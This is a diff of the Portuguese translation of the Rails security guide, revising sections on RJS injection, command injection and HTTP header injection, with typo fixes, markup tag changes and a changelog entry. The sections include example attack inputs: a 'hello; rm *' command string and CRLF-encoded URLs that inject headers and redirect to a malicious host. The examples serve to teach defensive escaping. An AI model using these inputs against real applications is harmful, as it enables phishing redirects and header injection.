-Se você usa o "plugin in_place_editor":http://dev.rubyonrails.org/browser/plugins/in_place_editing, ou actions que retornam uma string, ao invés de uma view renderizada, _(highlight)você deve filtrar o vlor retornado na action_. Caso contrário se o valor de retorno contiver uma string XSS, o código malicioso será executado assim que for retornado para o navegador. Filtre estes dados usando o m=etodo +h()+.
+Se você usa o "plugin in_place_editor":http://dev.rubyonrails.org/browser/plugins/in_place_editing, ou actions que retornam uma string, ao invés de uma view renderizada, _(highlight)você deve filtrar o valor retornado na action_. Caso contrário se o valor de retorno contiver uma string XSS, o código malicioso será executado assim que for retornado para o navegador. Filtre estes dados usando o m=etodo +h()+.
 
 h4. Injeção de RJS
 
 -- _Não se esqueça de também filtrar em templates JavaScript (RJS)_.
 
- A API de RJS gera blocos de código JavaScript baseado em código Ruby, permitindo assim que você manipule a página ou partes dela a partir do lado servidor. _(highlight)Se você permite que usuários forneçam dados de entrada em templates RJS, filtre-os usando +escape_javascript()+ dentro de funções JavaScript, e em partes HTML usando +h()+_. De outro modo um atacante poderia executar JavaScript arbitrário.
+A API de RJS gera blocos de código JavaScript baseado em código Ruby, permitindo assim que você manipule a página ou partes dela a partir do lado servidor. _(highlight)Se você permite que usuários forneçam dados de entrada em templates RJS, filtre-os usando +escape_javascript()+ dentro de funções JavaScript, e em partes HTML usando +h()+_. De outro modo um atacante poderia executar JavaScript arbitrário.
 
 h4. Injeção de linha de comando
 
@@ -899,44 +913,43 @@ Se sua aplicação deve executar comandos no sistema operacional, existem divers
 
 Uma medida preventiva é _(highlight)utilizar o método +system(command, parameters)+, o qual passa parâmetros de linha de comando de forma segura_.
 
-<pre>
+<ruby>
 system("/bin/echo","hello; rm *")
 # prints "hello; rm *" and does not delete files
-</pre>
-
+</ruby>
 
 h4. Injeção de cabeçalho
 
 -- _Cabeçalhos HTTP são gerados dinâmicamente e sob certas circunstâncias pode-se injetar dados do usuário. Isso pode levar a reddirecionamentos falsos, XSS ou HTTP response splitting._
 
-Cabeçalhos de requests HTTP possuem um campos para Referer, User-Agent (software do lado cliente) e Cookie, entre outros. Cabeçalhos de responses por exemplo possuem um código de status, Coolkie e Location (alvo de redirecionamento HTTP). Todos eles são fornecidos pelo usuário e podem ser manipulados com mais ou menos esforço. _(highlight)Lembre-se de filtrar estes campos de cabeçalho também_. Por exemplo quando você exibe o user agent em uma área administrativa.
+Cabeçalhos de requests HTTP possuem campos para Referer, User-Agent (software do lado cliente) e Cookie, entre outros. Cabeçalhos de responses por exemplo possuem um código de status, Coolkie e Location (alvo de redirecionamento HTTP). Todos eles são fornecidos pelo usuário e podem ser manipulados com mais ou menos esforço. _(highlight)Lembre-se de filtrar estes campos de cabeçalho também_. Por exemplo quando você exibe o user agent em uma área administrativa.
 
-Além disso, _(highlight)é importante saber o que você está fazendo quando estiver construindo cabeçalhos de response parcialmente baseados em dados fornecidos pelo usuário._ Por exemplo você quer redirecionar o usuário dee volta à uma página específica. Para fazer isso você introduz um campo "referer" em um formulário para fazer redirecionamenteo para o endereço fornecido:
+Além disso, _(highlight)é importante saber o que você está fazendo quando estiver construindo cabeçalhos de response parcialmente baseados em dados fornecidos pelo usuário._ Por exemplo você quer redirecionar o usuário de volta à uma página específica. Para fazer isso você introduz um campo "referer" em um formulário para fazer redirecionamenteo para o endereço fornecido:
 
-<pre>
+<ruby>
 redirect_to params[:referer]
-</pre>
+</ruby>
 
 O que acontece é que o Rails coloca a string no campo de cabeçalho Location e envia o código de status 302 (redirect) para o navegador. A primeira coisa que um usuário malicioso faria é isso:
 
-<pre>
+<plain>
 http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
-</pre>
+</plain>
 
 E devido a um bug no (Ruby e no) Rails existente até a versão 2.1.2 (excluindo esta), um hacker pode injetar campos de cabeçalho arbitrários; por exemplo, assim:
 
-<pre>
+<plain>
 http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
 http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
-</pre>
+</plain>
 
-Perceba que "%0d%0a" é o valor codificado para URL de "\r\n" o qual é um retorno do carro e nova linha (CRLF) em Ruby. Assim o cabeçalho HTTP resultante para o segundo exemplo seria o seguinte porque o segundo campos de cabeçalho Location sobrescreve o primeiro.
+Perceba que "%0d%0a" é o valor codificado para URL de "\r\n" o qual é um carriage return e nova linha (CRLF) em Ruby. Assim o cabeçalho HTTP resultante para o segundo exemplo seria o seguinte porque o segundo campo de cabeçalho Location sobrescreve o primeiro.
 
-<pre>
+<plain>
 HTTP/1.1 302 Moved Temporarily
 (...)
 Location: http://www.malicious.tld
-</pre>
+</plain>
 
 _(highlight)Vetores de ataque para injeção de cabeçalho são baseados na injeção de caracteres de CRLF no campo do cabeçalho._ E o que um atacante poderia fazer com um redirecionamento falso? Ele poderia redirecionar para um site de phishing que se pareça o mesmo que o seu, mas que solicita que o usuário faça login novamente (e envia as credenciais de login para o atacante). Ou ele poderia instalar software malicioso neste site através de falhas de segurança no navegador. _(highlight)O Rails 2.1.2 filtra estes caracteres para o campo Location no método +redirect_to+ . Certifique-se de fazer isso você mesmo quando você construir outros campos de cabeçalho com dados fornecidos pelo usuário._
 
@@ -978,5 +991,6 @@ h3. Changelog
 
 "Lighthouse ticket":http://rails.lighthouseapp.com/projects/16213-rails-guides/tickets/7
 
+* Março 14, 2009: Revisão da tradução por "Daniel Lopes":translators.html#danielvlopes
 * Tradução por "Cássio Marques":translators.html#cassiomarques
 * November 1, 2008: First approved version by Heiko Webers
